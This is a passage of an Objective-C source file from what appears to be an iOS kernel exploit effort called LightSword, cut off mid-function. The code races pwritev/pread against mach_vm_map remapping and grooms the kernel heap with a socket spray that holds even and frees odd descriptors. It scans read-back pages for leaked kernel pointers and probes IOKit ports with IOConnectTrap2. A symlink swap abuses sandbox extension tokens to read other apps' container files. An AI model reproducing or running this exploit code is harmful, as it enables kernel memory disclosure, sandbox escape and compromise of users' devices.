// LSIDCalib.m
// v11 (2026-11-19) PERMANENT PLAN: no knob files, no auto rotation. Default tap =
//   H control + ID sweep + v10 hot replay + v14 reclaim. v12/v12.2 arm-gated
//   (cscalib_v12_arm.txt, stall class, fully bounded); v13 arm-gated
//   (cscalib_v13_arm.txt, CRASH class — it took down the main app once).
//   EVERY racing-loop kernel call (pwritev/pwrite/pread) runs on a bounded
//   worker: a wedge parks one thread and the tap moves on. The a11a M0 tag is
//   RETIRED: fill = same-boot heap anchor (p159 first) else the per-boot hmarker.
// v10: Hot-Replay Tuner (ID-sweep choreography, unsplit, spray-ON) + hot-offset persistence

#import "LSIDCalib.h"
#import "LabKnob.h"
#import "LabBandit.h"
#import "LabHeapAnchor.h"

#include <dlfcn.h>
#include <errno.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/icmp6.h>
#include <sys/uio.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/sysctl.h>

/* v13: Metal + IOKit only — the Xcode 26 iOS SDK (debug job) does NOT
   expose IOSurface/IOSurface.h, so IOSurfaceRef stays a local typedef and
   IOSurfaceGetID is dlsym'd in v13_loadTrap(). */
#import <Metal/Metal.h>
#import <IOKit/IOKitLib.h>

typedef struct __IOSurface *IOSurfaceRef;
kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef void *(*IOSurfaceGetBaseAddress_t)(IOSurfaceRef);
typedef void (*IOSurfacePrefetchPages_t)(IOSurfaceRef);

#define PAGE_TAG_BASE 0xC0DEC0DE00000000ULL
#define PAGE_ID(i) (PAGE_TAG_BASE | (uint64_t)(i))
#define M0_TAG      0xA11AA11AA11AA11AULL

#define RC_ITERS_H  3000
#define RC_TRIES    30
#define RC_STRIDE   8
#define RC_NQ       (0xf00 / 8)
#define RC_HOLD_MAX 4096
static int rc_hold[RC_HOLD_MAX];
static int rc_holdN = 0;
static uint32_t g_rcHoldCap = RC_HOLD_MAX; /* 12 EMFILE receipts: cap the groom holds under the process fd limit so the spray never starts blind (24 = table already full) */
static int g_rc_log_fd;   /* forward decl: the spray thread's wall diagnostic
                             runs before the definition below */

/* v14 knob-ID fix (2026-11-15): the catalog row's id is "cscalib" — the
   in-app knob editor writes Documents/knob_cscalib.txt. The calib used to
   read only "cscali", so UI-set knobs NEVER reached a tap (every install
   ran the default v12+v12.2 plan and stalled at v12). Catalog id first,
   legacy alias second. */
/* auto plan (2026-11-15): knob unset → rotate the stall-free stages
   v14 → v13 → v12.2 by least-attempted, history in Documents/calib_plan.txt.
   v12 never auto-runs (pre-write stall law, both devices). Explicit knob
   always overrides. */
static void rc_plan_path(char *p, size_t cap) {
    NSString *d = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    snprintf(p, cap, "%s/calib_plan.txt", [d fileSystemRepresentation]);
}
static void rc_plan_note(const char *stage, unsigned hits) {
    char p[1200];
    rc_plan_path(p, sizeof p);
    FILE *f = fopen(p, "a");
    if (f) { fprintf(f, "%s hits=%u\n", stage, hits); fclose(f); }
}

/* ---- v13 RECLAIM machinery (purgeable state-1 feed) --------------------
   The staleentry census pattern, granular: Metal texture plant on the
   LOCK window's own bound surface → port-scan IOGPU conns →
   Trap2(conn, 3, rid, 1) → race iters → Trap2(conn, 3, rid, 0).
   NO surface teardowns, NO munlock of live windows — the v12 stall law
   (pwritev blocks when backing dies under a live copy descriptor) is
   avoided structurally. state=6 (bulk teardown sweep, 23F77 decode) is
   BANNED here; only 1 (volatile) and 0 (restore) are ever sent. */
typedef kern_return_t (*v13Trap2_t)(io_connect_t, uint32_t, uint32_t, uint32_t);
typedef uint32_t (*v13GetID_t)(IOSurfaceRef);
static v13Trap2_t v13_sTrap2 = NULL;
static v13GetID_t v13_getID = NULL;
static void v13_loadTrap(void) {
    if (v13_sTrap2) return;
    v13_sTrap2 = (v13Trap2_t)dlsym(RTLD_DEFAULT, "IOConnectTrap2");
    if (!v13_sTrap2) {
        void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        if (h) v13_sTrap2 = (v13Trap2_t)dlsym(h, "IOConnectTrap2");
    }
    v13_getID = (v13GetID_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
    if (!v13_getID) {
        void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        if (h) v13_getID = (v13GetID_t)dlsym(h, "IOSurfaceGetID");
    }
}
/* All SEND-port candidate conns — exact sep_allConns() shape. The scan's
   probe call (state=1 on id=1) is the same one the staleentry census
   already fires on every port. */
static NSArray<NSNumber *> *v13_portScan(void) {
    NSMutableArray<NSNumber *> *acc = [NSMutableArray array];
    mach_port_name_array_t names = NULL;
    mach_port_type_array_t types = NULL;
    mach_msg_type_number_t nn = 0, nt = 0;
    if (mach_port_names(mach_task_self(), &names, &nn, &types, &nt) != KERN_SUCCESS)
        return acc;
    if (!v13_sTrap2) return acc;
    for (mach_msg_type_number_t i = 0; i < nn; i++) {
        if (!(types[i] & MACH_PORT_TYPE_SEND)) continue;
        mach_port_name_t p = names[i];
        if (p < 0x100 || p > 0x40000) continue;
        kern_return_t kr = v13_sTrap2((io_connect_t)p, 3, 1, 1);
        if (kr == (kern_return_t)0x10000003 ||  /* MACH_SEND_INVALID_DEST */
            kr == KERN_FAILURE ||
            kr == (kern_return_t)0xe00002c7)    /* unsupported (wrong driver) */
            continue;
        [acc addObject:@(p)];
    }
    if (names && nn) vm_deallocate(mach_task_self(), (vm_address_t)names,
                                   nn * sizeof(mach_port_name_t));
    if (types && nt) vm_deallocate(mach_task_self(), (vm_address_t)types,
                                   nt * sizeof(mach_port_type_t));
    return acc;
}

/* Socket Spray Constants (matching ClearSword socket.c) */
#define SOCK_SPRAY_BURST 512
#define SOCK_SPRAY_DELAY 50

static volatile int rc_started = 0;
static volatile int rc_go = 0;
static volatile int rc_raceOn = 0;
static volatile mach_vm_address_t rc_mapAddr = 0;
static volatile mach_vm_size_t rc_mapSize = 0;
static volatile mach_port_t rc_mapObj = MACH_PORT_NULL;
static volatile mach_vm_offset_t rc_mapOff = 0;
static volatile uint64_t rc_mapErr = 0;

static volatile int rc_sprayGo = 0;
static volatile uint64_t rc_sprayAllocs = 0;
static volatile uint64_t rc_sprayFrees = 0;

static void *rc_swap_thread(void *arg) {
    (void)arg;
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
    while (!rc_started);
    while (rc_go) {
        while (!rc_raceOn && rc_go);
        if (!rc_go) break;
        mach_vm_address_t a = rc_mapAddr;
        kern_return_t kr = mach_vm_map(mach_task_self(), &a, rc_mapSize, 0,
                                       VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                       rc_mapObj, rc_mapOff, false,
                                       VM_PROT_DEFAULT, VM_PROT_DEFAULT,
                                       VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) rc_mapErr++;
        rc_raceOn = 0;
    }
    return NULL;
}

/* 2026-11-19 pre-write freeze fix: bound every 'while (rc_raceOn == 1)'
   spin. The swap thread clears rc_raceOn only if its mach_vm_map RETURNS;
   a genuine kernel-side wedge must end the stage honestly, not freeze the
   tap at its last pre-write line. 5 s bound, 200 us poll.
   0 = cleared; -1 = stalled (sets rc_swap_dead — stop racing this boot). */
static volatile int rc_swap_dead = 0;
static int g_rcSwapRearmed = 0;
/* 2026-11-19 multi-anchor: the full same-boot set (m0 = [0]; the v14
   reclaim spray carries [1]). Classifiers exclude the whole set. */
static uint64_t g_rcAnchors[4] = {0};
static int g_rcAnchorN = 0;
static BOOL rc_is_own_anchor(uint64_t q) {
    if (!g_rcAnchorN) return NO;
    for (int i = 0; i < g_rcAnchorN; i++) if (g_rcAnchors[i] == q) return YES;
    return NO;
}
static int rc_raceOn_wait(uint64_t ms) {
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    while (rc_raceOn == 1) {
        clock_gettime(CLOCK_MONOTONIC, &t1);
        uint64_t el = (uint64_t)(t1.tv_sec - t0.tv_sec) * 1000ull +
                      ((uint64_t)t1.tv_nsec - (uint64_t)t0.tv_nsec) / 1000000ull;
        if (el >= ms) { rc_swap_dead = 1; return -1; }
        usleep(200);
    }
    return 0;
}

/* The ClearSword Socket Spray Thread (SOCK_DGRAM) */
static void *rc_socket_spray_thread(void *arg) {
    (void)arg;
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);

    uint32_t blindBursts = 0;
    while (rc_sprayGo) {
        int fds[SOCK_SPRAY_BURST];
        int count = 0;
        
        // Spray sockets (allocates inpcb in kernel)
        // FIX: Use SOCK_DGRAM instead of SOCK_RAW to bypass sandbox restrictions
        for (int i = 0; i < SOCK_SPRAY_BURST; i++) {
            fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
            if (fds[i] >= 0) {
                count++;
            } else if (count == 0 && i == 0) {
                /* name the wall once (the 12-debugger sockets=0 boot) */
                if (g_rc_log_fd >= 0)
                    dprintf(g_rc_log_fd,
                            "[spray] first socket() failed errno=%d — thread is blind\n",
                            errno);
            }
        }
        
        // THE INTERLEAVED GROOM (2026-11-07, the AIM/oob decode — rig law,
        // unified into main per the calib-unification commit): hold every
        // EVEN fd (persistent occupancy), close every ODD fd (freed slots
        // refilled by SYSTEM churn = other processes' pointer-bearing
        // structures). The confused read then has foreign pages in play.
        static int g_interleaveTotal = 0;
        int held = 0;
        for (int i = 0; i < SOCK_SPRAY_BURST; i++) {
            if (fds[i] < 0) continue;
            if (i & 1) {
                close(fds[i]);
                rc_sprayFrees++;
            } else {
                g_interleaveTotal++;
                held++;
            }
        }
        if (g_interleaveTotal > 4096) {
            for (int i = 0; i < rc_holdN; i++) close(rc_hold[i]);
            rc_holdN = 0; g_interleaveTotal = 0;
        }
        if (rc_holdN + held < (int)(sizeof(rc_hold)/sizeof(rc_hold[0])) &&
            rc_holdN + held < (int)g_rcHoldCap) {
            for (int i = 0; i < SOCK_SPRAY_BURST; i++)
                if (fds[i] >= 0 && !(i & 1)) rc_hold[rc_holdN++] = fds[i];
        } else {
            for (int i = 0; i < SOCK_SPRAY_BURST; i++) if (fds[i] >= 0 && !(i & 1)) close(fds[i]);
        }
        rc_sprayAllocs += count;
        /* v12.1 fd-law: a table already full (errno 24 = EMFILE) makes every
           burst blind — give the calib its thread back after 32 and name it */
        if (count == 0) {
            if (++blindBursts >= 32) {
                if (g_rc_log_fd >= 0)
                    dprintf(g_rc_log_fd,
                            "[spray] 32 blind bursts (last errno=%d) — thread exits; "
                            "fd table is full before the spray (groom cap next boot)\n",
                            errno);
                return NULL;
            }
        } else blindBursts = 0;
        usleep(SOCK_SPRAY_DELAY);
    }
    return NULL;
}



/* v3 calib-aim (rig law, unified into main): on WRONG/FOREIGN/PARTIAL
   classify every qword with both pointer bands (0xfffffff0 = 23F77 band,
   0xfffffe00 = 24A band), then walk +4 pages hunting the pointer-bearing
   page. The KPTR row = the receipt-class lane on REAL hits. */

/* ---- LSWCAL stall guard (2026-11-18, the user's receipts: the 17's 24B156
   calib wedged at "[v14] window 0 pre-write" forever) ----------------------
   pwritev BLOCKS when the window backing dies under the live descriptor.
   Bounded helper: the syscall runs on a detached worker; 5 s wait; on
   timeout mark rc14_stalled, leave the worker parked (one blocked syscall,
   harmless), caller decides (munlock/teardown/continue). */
static volatile int rc_pwritev_done14 = 0;
static volatile int rc_pwritev_rv14 = 0;
static volatile int rc_pwritev_errno14 = 0;   /* worker-side errno stash */
static int rc_pwritev_errno_out14 = 0;        /* waiter-published errno */
/* 2026-11-19 freeze fix: the old waiter called pthread_cond_timedwait on a
   condvar NOBODY signals, with the mutex not held (UB) — the fast path
   burned the full 5 s budget on EVERY call and the wedge path relied on
   accident. Proper protocol: worker signals under the mutex; the waiter
   holds the mutex and returns the instant done flips; -2 only on real
   timeout (the worker stays parked in its one blocked syscall). */
struct rc_pw14_args { int fd; struct iovec iov; off_t ofs; };
static pthread_mutex_t rc_pw14_mu = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t  rc_pw14_cv = PTHREAD_COND_INITIALIZER;
static void *rc_pw14_worker(void *arg) {
    struct rc_pw14_args *a = (struct rc_pw14_args *)arg;
    errno = 0;
    ssize_t w = pwritev(a->fd, &a->iov, 1, a->ofs);
    pthread_mutex_lock(&rc_pw14_mu);
    rc_pwritev_rv14 = (int)w;
    rc_pwritev_errno14 = (w < 0) ? errno : 0;
    rc_pwritev_done14 = 1;
    pthread_cond_broadcast(&rc_pw14_cv);
    pthread_mutex_unlock(&rc_pw14_mu);
    return NULL;
}
static int rc_pwritev_bounded14(int fd, void *base, size_t len, off_t ofs, uint64_t ms) {
    static struct rc_pw14_args args;
    args.fd = fd; args.iov.iov_base = base; args.iov.iov_len = len; args.ofs = ofs;
    pthread_mutex_lock(&rc_pw14_mu);
    rc_pwritev_done14 = 0; rc_pwritev_rv14 = 0;
    pthread_mutex_unlock(&rc_pw14_mu);
    pthread_t th;
    if (pthread_create(&th, NULL, rc_pw14_worker, &args) != 0)
        return -2;   /* NEVER a sync fallback — a spawn failure is a bounded miss */
    struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
    ts.tv_sec += (time_t)(ms / 1000);
    ts.tv_nsec += (long)(ms % 1000) * 1000000L;
    if (ts.tv_nsec >= 1000000000L) { ts.tv_sec += 1; ts.tv_nsec -= 1000000000L; }
    int rv = -2;
    pthread_mutex_lock(&rc_pw14_mu);
    while (!rc_pwritev_done14) {
        if (pthread_cond_timedwait(&rc_pw14_cv, &rc_pw14_mu, &ts) == ETIMEDOUT) break;
    }
    if (rc_pwritev_done14) { rv = rc_pwritev_rv14; rc_pwritev_errno_out14 = rc_pwritev_errno14; }
    else rc_pwritev_errno_out14 = -1;   /* timeout: no errno */
    pthread_mutex_unlock(&rc_pw14_mu);
    pthread_detach(th);
    return rv;
}
/* generic bounded pread (kind 2) / pwrite (kind 1) on the same protocol.
   2026-11-19 permanent bounding: a wedged racing-loop syscall parks ONE
   worker in-kernel and the tap moves on — the hang class is dead. */
struct rc_fd14_args { int kind; int fd; void *buf; size_t len; off_t ofs; };
static void *rc_fd14_worker(void *arg) {
    struct rc_fd14_args *a = (struct rc_fd14_args *)arg;
    errno = 0;
    ssize_t w = (a->kind == 2) ? pread(a->fd, a->buf, a->len, a->ofs)
                                : pwrite(a->fd, a->buf, a->len, a->ofs);
    pthread_mutex_lock(&rc_pw14_mu);
    rc_pwritev_rv14 = (int)w;
    rc_pwritev_errno14 = (w < 0) ? errno : 0;
    rc_pwritev_done14 = 1;
    pthread_cond_broadcast(&rc_pw14_cv);
    pthread_mutex_unlock(&rc_pw14_mu);
    return NULL;
}
static int rc_fd_bounded(int kind, int fd, void *buf, size_t len, off_t ofs, uint64_t ms) {
    static struct rc_fd14_args args;
    args.kind = kind; args.fd = fd; args.buf = buf; args.len = len; args.ofs = ofs;
    pthread_mutex_lock(&rc_pw14_mu);
    rc_pwritev_done14 = 0; rc_pwritev_rv14 = 0; rc_pwritev_errno14 = 0;
    pthread_mutex_unlock(&rc_pw14_mu);
    pthread_t th;
    if (pthread_create(&th, NULL, rc_fd14_worker, &args) != 0) return -2;
    struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
    ts.tv_sec += (time_t)(ms / 1000);
    ts.tv_nsec += (long)(ms % 1000) * 1000000L;
    if (ts.tv_nsec >= 1000000000L) { ts.tv_sec += 1; ts.tv_nsec -= 1000000000L; }
    int rv = -2;
    pthread_mutex_lock(&rc_pw14_mu);
    while (!rc_pwritev_done14) {
        if (pthread_cond_timedwait(&rc_pw14_cv, &rc_pw14_mu, &ts) == ETIMEDOUT) break;
    }
    if (rc_pwritev_done14) { rv = rc_pwritev_rv14; rc_pwritev_errno_out14 = rc_pwritev_errno14; }
    else rc_pwritev_errno_out14 = -1;
    pthread_mutex_unlock(&rc_pw14_mu);
    pthread_detach(th);
    return rv;
}

@implementation LSIDCalib

/* catalog entry-point alias (Lum1na catalog's invokeController law: +tap) */
+ (NSString *)tap {
    return [LSIDCalib runCalib];
}

static int g_rc_log_fd = -1;
static int g_hotPersistFd = -1;   /* reserved BEFORE the groom/spray eats the
                                     fd table (the 17-debugger errno=24 receipt
                                     law: a late open EMFILEs and the boot's
                                     hot offsets are lost) */
static int g_rcUntagged = 0;      /* v3 spray-tag knob (bandit arm "untagged") */
/* 2026-11-19 anchor-tag: REAL same-boot heap kptr from the board leaks[]
   (LabHeapAnchorSameBoot). When nonzero it REPLACES the a11a constant as
   the m0 fill (knob "untagged" still wins). Own-page classifiers treat the
   anchor exactly like M0_TAG — an anchor-tagged window is a geometry
   measurement of our own pages, NEVER a FOREIGN/kptr claim. */
static uint64_t g_rcAnchor = 0;   /* g_rcAnchors/g_rcAnchorN live above rc_is_own_anchor */
static BOOL g_rcBanditInit = NO;  /* one-shot cscali domain registration */
static NSMutableString *g_rc_log_str = nil;

static void rc_log(const char *fmt, ...) {
    char buf[4096];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    fprintf(stderr, "%s\n", buf);
    fflush(stderr);
    if (g_rc_log_fd >= 0) {
        write(g_rc_log_fd, buf, strlen(buf));
        write(g_rc_log_fd, "\n", 1);
        fcntl(g_rc_log_fd, F_FULLFSYNC);
    }
    if (g_rc_log_str) [g_rc_log_str appendFormat:@"%s\n", buf];
    usleep(1000);
}


/* ---- v11 CROSS-APP HOT SYNC (the 24A435 hot-file law) ----------------
   The hot file is per-container. The OTHER Lum1na build accumulates the
   warm set (24A435: the main app's container held 454 offsets while the
   debugger started cold on every reinstall). Merge law: enumerate app
   containers (MCM class 15, metadata-only flags), read each candidate's
   Documents/lightsword_hot.txt (fallback racecalib_hot.txt) through the
   P116 issue/swap/consume read, parse offsets, dedup into the warm set.
   Read-only outside our own container; tokens never logged. */
static long rc_read_remote(const char *abs, char *out, long cap) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *work = [docs stringByAppendingPathComponent:@"rcsync"];
    [[NSFileManager defaultManager] createDirectoryAtPath:work
        withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *s = [work stringByAppendingPathComponent:@"s"];
    NSString *l = [work stringByAppendingPathComponent:@"l"];
    [@("rcsync-marker\n") writeToFile:s atomically:YES encoding:NSUTF8StringEncoding error:nil];
    unlink(l.UTF8String);
    if (symlink(s.UTF8String, l.UTF8String) != 0) return -1;
    char *(*issueFn)(const char *, const char *, uint64_t) =
        (char *(*)(const char *, const char *, uint64_t))dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file");
    if (!issueFn) return -1;
    char *tok = issueFn("com.apple.app-sandbox.read", l.UTF8String, 0);
    if (!tok) return -1;
    unlink(l.UTF8String);
    if (symlink(abs, l.UTF8String) != 0) { memset(tok, 0, strlen(tok)); free(tok); return -1; }
    int64_t h = ((int64_t (*)(const char *))dlsym(RTLD_DEFAULT, "sandbox_extension_consume"))(tok);
    memset(tok, 0, strlen(tok)); free(tok);
    if (h <= 0) return -1;
    long total = 0;
    int fd = open(l.UTF8String, O_RDONLY);
    if (fd >= 0) {
        while (total < cap) {
            ssize_t r = read(fd, out + total, (size_t)(cap - total));
            if (r <= 0) break;
            total += r;
        }
        close(fd);
    }
    void (*rel)(int64_t) = (void (*)(int64_t))dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (rel) rel(h);
    unlink(l.UTF8String);
    return total > 0 ? total : -1;
}

static uint32_t rc_hotsync_warm(uint64_t *warm, uint32_t warmNin) {
    __block uint32_t warmN = warmNin;
    typedef void *(*cq_create_t)(void);
    typedef void (*cq_set_class_t)(void *, uint64_t);
    typedef void (*cq_set_flags_t)(void *, uint64_t);
    typedef void (*cq_iterate_t)(void *, void (^)(void *));
    typedef void (*cq_free_t)(void *);
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) { rc_log("[hotsync] containermanager dlopen miss"); return warmN; }
    cq_create_t qCreate = (cq_create_t)dlsym(mgr, "container_query_create");
    cq_set_class_t qClass = (cq_set_class_t)dlsym(mgr, "container_query_set_class");
    cq_set_flags_t qFlags = (cq_set_flags_t)dlsym(mgr, "container_query_operation_set_flags");
    cq_iterate_t qIterate = (cq_iterate_t)dlsym(mgr, "container_query_iterate_results_sync");
    cq_free_t qFree = (cq_free_t)dlsym(mgr, "container_query_free");
    char *(*oIdent)(void *) = (char *(*)(void *))dlsym(mgr, "container_object_get_identifier");
    void (*oPath)(void *, char *, uint64_t) = (void (*)(void *, char *, uint64_t))dlsym(mgr, "container_object_get_path");
    if (!qCreate || !qClass || !qFlags || !qIterate || !qFree || !oPath) {
        rc_log("[hotsync] mcm syms miss"); return warmN;
    }
    void *q = qCreate();
    if (!q) { rc_log("[hotsync] query create fail"); return warmN; }
    qClass(q, 15);                    /* app-managed containers, metadata-only */
    qFlags(q, 0x100000000ULL);
    __block uint32_t merged = 0;
    __block int cands = 0;
    void (^fill)(void *) = ^void(void *obj) {
        char path[1024]; path[0] = 0;
        oPath(obj, path, sizeof path);
        if (!path[0]) return;
        cands++;
        static const char *names[2] = { "lightsword_hot.txt", "racecalib_hot.txt" };
        static char buf[8192];
        for (int ni = 0; ni < 2; ni++) {
            char target[1200];
            snprintf(target, sizeof target, "%s/Documents/%s", path, names[ni]);
            long n = rc_read_remote(target, buf, (long)sizeof buf - 1);
            if (n <= 0) continue;
            buf[n] = 0;
            char *save = NULL;
            for (char *ln = strtok_r(buf, "\n", &save); ln; ln = strtok_r(NULL, "\n", &save)) {
                uint64_t v = 0;
                if (sscanf(ln, "%llx", &v) == 1 && v) {
                    int dup = 0;
                    for (uint32_t k = 0; k < warmN; k++) if (warm[k] == v) { dup = 1; break; }
                    if (!dup && warmN < 512) { warm[warmN++] = v; merged++; }
                }
            }
            if (merged && oIdent) {
                char *ident = oIdent(obj);
                NSString *nm = ident ? [NSString stringWithUTF8String:ident] : @"";
                rc_log("[hotsync] merged=%u from %@", merged, nm);
            }
            break;                      /* one name per container is enough */
        }
        return;
    };

    qIterate(q, fill);
    rc_log("[hotsync] pass1 class=15 flags=0x100000000 containers=%d merged=%u",
           cands, merged);
    if (cands == 0) {
        /* pass2: same class, no operation flags — the 17-debugger receipt
           showed pass1 empty; a bare metadata query either enumerates or
           proves the XPC wall, and the log line names which */
        qFree(q);
        void *q2 = qCreate();
        if (q2) {
            qClass(q2, 15);
            qFlags(q2, 0);
            qIterate(q2, fill);
            rc_log("[hotsync] pass2 flags=0 containers=%d merged=%u", cands, merged);
            qFree(q2);
        }
        if (cands == 0)
            rc_log("[hotsync] MCM enumerated ZERO containers — XPC denied or no visible app-managed set");
    } else {
        qFree(q);
    }
    rc_log("[hotsync] containers=%d merged=%u total-warm=%u", cands, merged, warmN);
    return warmN;
}

typedef enum { C_M0, C_CORRECT, C_WRONG, C_FOREIGN, C_ZERO, C_PARTIAL } rc_cls_t;
static uint64_t g_calibAim = 0;
static void rc_aim(const uint64_t *rbBuf, uint32_t cls, int fdMark,
                   uint64_t off, unsigned long vm_page_size, uint64_t hmarker) {
    if (g_calibAim++ >= 12) return;
    uint64_t kptrs[8] = {0}; int kn = 0, cont = 0, zro = 0;
    for (size_t qi = 0; qi < RC_NQ; qi++) {
        uint64_t q = rbBuf[qi];
        if (q == hmarker) continue;
        if (rc_is_own_anchor(q)) continue;   /* own m0 fill — not a kptr */
        if (q == 0) { zro++; continue; }
        if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
            q >= 0xfffffe0000000000ull) {
            if (kn < 8) kptrs[kn++] = q;
        }
        cont++;
    }
    rc_log("  AIM %s: content-qwords=%llu zero=%llu KPTR=%llu%s",
           cls == C_PARTIAL ? "PARTIAL" : (cls == C_WRONG ? "WRONG" : "FOREIGN"),
           (unsigned long long)cont, (unsigned long long)zro,
           (unsigned long long)kn, kn ? "  <-- POINTERS" : "");
    for (int ki = 0; ki < kn; ki++)
        rc_log("  AIM kptr[%d]=0x%016llx", ki, (unsigned long long)kptrs[ki]);
    if (kn == 0) {
        for (int st = 1; st <= 4; st++) {
            uint8_t wb[RC_NQ * 8];
            ssize_t wn = (ssize_t)rc_fd_bounded(2, fdMark, wb, sizeof(wb),
                                 (off_t)off + 0x4000 + (off_t)st * (off_t)vm_page_size, 5000);
            if (wn < 8) break;
            uint64_t *wq8 = (uint64_t *)wb;
            int wkn = 0, wcont = 0; uint64_t wfirst = 0;
            for (size_t qi = 0; qi < RC_NQ; qi++) {
                uint64_t q = wq8[qi];
                if (q == 0) continue;
                if (rc_is_own_anchor(q)) continue;   /* own m0 fill — not a kptr */
                wcont++;
                if (wfirst == 0) wfirst = q;
                if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
                    q >= 0xfffffe0000000000ull) wkn++;
            }
            if (wcont)
                rc_log("  AIM-walk +%#02x content=%llu kptr=%llu first=0x%016llx",
                       (st * 0x4000), (unsigned long long)wcont,
                       (unsigned long long)wkn, (unsigned long long)wfirst);
            if (wkn > 0) break;
        }
    }
}

static rc_cls_t rc_cls(const uint64_t *buf, uint32_t expected, uint32_t npages,
                       uint64_t *got, int32_t *delta) {
    uint64_t first = buf[0];
    int all = 1;
    for (int i = 1; i < RC_NQ; i++) if (buf[i] != first) { all = 0; break; }
    *got = first;
    *delta = 0;
    if (!all) return C_PARTIAL;
    if (first == 0) return C_ZERO;
    if (first == M0_TAG) return C_M0;
    /* anchor-tag law: an all-anchor page is OUR OWN fill — classify as M0,
       never FOREIGN, even though the value is kptr-shaped (it is a REAL
       leaked heap address, but the page is ours). */
    if (rc_is_own_anchor(first)) return C_M0;
    if ((first & 0xFFFFFFFF00000000ULL) == PAGE_TAG_BASE) {
        uint32_t idx = (uint32_t)first;
        if (idx == expected) return C_CORRECT;
        if (idx < npages) { *delta = (int32_t)idx - (int32_t)expected; return C_WRONG; }
    }
    /* Check for kernel pointers (inpcb structure fields) */
    /* inpcb starts with LIST_ENTRY (pointers). If we see 0xfffffff0..., it's a kernel object! */
    if ((first >> 36) == 0xfffffff0ULL) return C_FOREIGN;
    /* Also check offset 0x40 (inpcb.inp_socket) which is a common pointer */
    if ((buf[8] >> 36) == 0xfffffff0ULL) return C_FOREIGN;
    
    return C_FOREIGN;
}

static CFNumberRef RCNUM(int64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

+ (NSString *)runCalib {
    g_rc_log_str = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"racecalib_log.txt"];
    g_rc_log_fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    rc_log("time %s", [[[NSDate date] description] UTF8String]);
    rc_log("=== LightSword calib v14 — SOCK_DGRAM socket spray ===");
    {
        char mch[64] = "?", osv[32] = "?";
        size_t mlen = sizeof mch, olen = sizeof osv;
        sysctlbyname("hw.machine", mch, &mlen, NULL, 0);
        sysctlbyname("kern.osversion", osv, &olen, NULL, 0);
        rc_log("IDENT device=%s os=%s", mch, osv);
    }
    /* LightSword: hot-offset set from previous boots (per-boot law — PARTIAL
       windows rotate/recur across boots; the tuner accumulates the set).
       Reads lightsword_hot.txt, falling back to the legacy racecalib_hot.txt
       so pre-rename accumulated warm sets survive. Writes under the new name. */
    uint64_t rc_warm[512]; uint32_t warmN = 0;
    char hotfile[512];
    char wrongfile[512];
    {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *hp2 = [docs stringByAppendingPathComponent:@"lightsword_hot.txt"];
        snprintf(hotfile, sizeof hotfile, "%s", [hp2 fileSystemRepresentation]);
        NSString *wp2 = [docs stringByAppendingPathComponent:@"lightsword_wrong.txt"];
        snprintf(wrongfile, sizeof wrongfile, "%s", [wp2 fileSystemRepresentation]);
        /* the reserve: open the persist fd NOW, before the groom/spray
           fills the table (17-debugger receipt: persist after runs
           EMFILEd, errno=24, and the boot's PARTIALs were lost) */
        g_hotPersistFd = open(hotfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
        rc_log("[hotsync] persist fd reserved fd=%d (%s)",
               g_hotPersistFd, g_hotPersistFd >= 0 ? hotfile : "FAILED");
        NSString *hpl = [docs stringByAppendingPathComponent:@"racecalib_hot.txt"];
        NSString *readFrom = [NSFileManager.defaultManager fileExistsAtPath:hp2] ? hp2 : hpl;
        NSString *srcName = [NSFileManager.defaultManager fileExistsAtPath:hp2] ? @"lightsword_hot.txt"
                          : ([NSFileManager.defaultManager fileExistsAtPath:hpl] ? @"racecalib_hot.txt" : @"(none)");
        FILE *hf0 = fopen([readFrom fileSystemRepresentation], "r");
        if (hf0) {
            char ln0[64];
            while (fgets(ln0, sizeof ln0, hf0)) {
                uint64_t v = 0;
